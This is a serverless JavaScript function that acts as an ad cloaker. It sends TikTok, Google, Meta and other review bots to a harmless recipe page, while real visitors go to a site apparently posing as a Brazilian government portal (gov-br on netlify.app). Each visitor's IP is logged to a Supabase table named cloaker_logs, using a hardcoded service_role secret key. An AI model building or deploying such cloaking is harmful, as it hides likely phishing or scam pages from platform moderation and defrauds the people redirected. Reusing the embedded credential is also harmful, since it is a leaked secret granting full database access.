exports.handler = async (event) => {
  const WHITE = "https://www.tudogostoso.com.br/categorias/1000-bolos-e-tortas-doces";
  const BLACK = "https://acnh-brasil-gov-br.netlify.app/";
  const SB_URL = "https://ldyhodwdhavrgyooukpi.supabase.co";
  const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeWhvZHdkaGF2cmd5b291a3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NjQxMDUyNCwiZXhwIjoyMTAxOTg2NTI0fQ.JvEtOi46gaL5fAFk8XnUUeEyPTibpC79NwPGMF8SvdY";

  const BOT_UA = [
    "bytespider","tiktok","bytedance","baiduspider",
    "googlebot","bingbot","facebookexternalhit","facebot",
    "meta-externalagent","applebot","yandexbot","slurp",
    "duckduckbot","linkedinbot","twitterbot","discordbot",
    "telegrambot","python-requests","python-urllib","curl/",
    "wget/","headlesschrome","phantomjs","selenium","webdriver",
    "puppeteer","playwright","scrapy","axios","node-fetch","postman"
  ];

  const ua = (event.headers["user-agent"] || "").toLowerCase();
  const isBot = BOT_UA.some(b => ua.includes(b));
  const ip = event.headers["x-forwarded-for"] || null;

  // Pega UTMs da query string e repassa para o BLACK
  const params = event.queryStringParameters || {};
  const utmKeys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","ttclid","fbclid","src","sck"];
  const utmParams = utmKeys.filter(k => params[k]).map(k => `${k}=${encodeURIComponent(params[k])}`).join("&");
  const blackUrl = utmParams ? `${BLACK}?${utmParams}` : BLACK;

  const result = isBot ? "BOT" : "REAL";
  const reason = isBot ? "Bot TikTok/rastreador detectado" : "Lead real - TikTok";

  // Loga no Supabase (fire and forget)
  try {
    fetch(`${SB_URL}/rest/v1/cloaker_logs`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": SB_KEY,
        "Authorization": `Bearer ${SB_KEY}`
      },
      body: JSON.stringify({
        user_agent: event.headers["user-agent"] || null,
        result,
        reason,
        country: "BR",
        ip
      })
    });
  } catch(e) {}

  const dest = isBot ? WHITE : blackUrl;

  return {
    statusCode: 302,
    headers: {
      "Location": dest,
      "Cache-Control": "no-cache, no-store, must-revalidate"
    },
    body: ""
  };
};
